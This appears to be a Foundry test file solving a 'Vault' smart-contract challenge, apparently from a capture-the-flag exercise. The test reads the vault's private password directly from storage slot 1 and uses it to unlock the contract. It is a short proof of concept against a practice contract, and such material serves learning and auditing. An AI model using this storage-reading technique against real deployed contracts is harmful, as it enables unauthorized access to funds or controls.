// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultTest is Test {
    Vault public c;
    address p = address(1337);

    function setUp() public {
        vm.deal(p, 1 ether);
        c = new Vault();
    }

    /// @dev Unlock the vault
    function testAttack() public {
        /// @dev check that vault is locked
        assertEq(c.locked(), true);
        vm.startPrank(p);
        /// @dev read storage of vault at slot 1 to get the password
        bytes32 password = vm.load(address(c), bytes32(uint256(1)));
        /// @dev unlock the vault using the password
        c.unlock(password);
        vm.stopPrank();
        /// @dev vault is now unlocked
        assertEq(c.locked(), false);
    }
}
